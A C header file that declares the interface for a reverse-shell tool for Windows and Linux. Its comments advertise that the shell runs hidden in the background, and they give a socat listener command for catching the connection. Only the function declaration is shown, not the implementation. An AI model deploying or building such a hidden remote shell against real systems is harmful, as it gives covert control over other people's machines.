#pragma once

#define REVSHELL_EXPORT 

/// @brief reverShell
/// @note Use with `socat.exe -d -d TCP4-LISTEN:4433,reuseaddr STDOUT`
/// A reverse shell for Windows and Linux written in C.
/**
Features:
- Linux and Windows version.
- Runs in the background (on both, Linux and Windows, no blocking terminal or black screen).
- You can choose between waiting for the client (if it's no listening) or not.
- Compile with just one command (see at the bottom of the `README.md`), there is also a `Makefile`.
 */
/// @param clientIp "127.0.0.1"
/// @param clientPort 4433
/// @return 0, success; >0, fail
REVSHELL_EXPORT int reverseShell(const char *clientIp, int clientPort);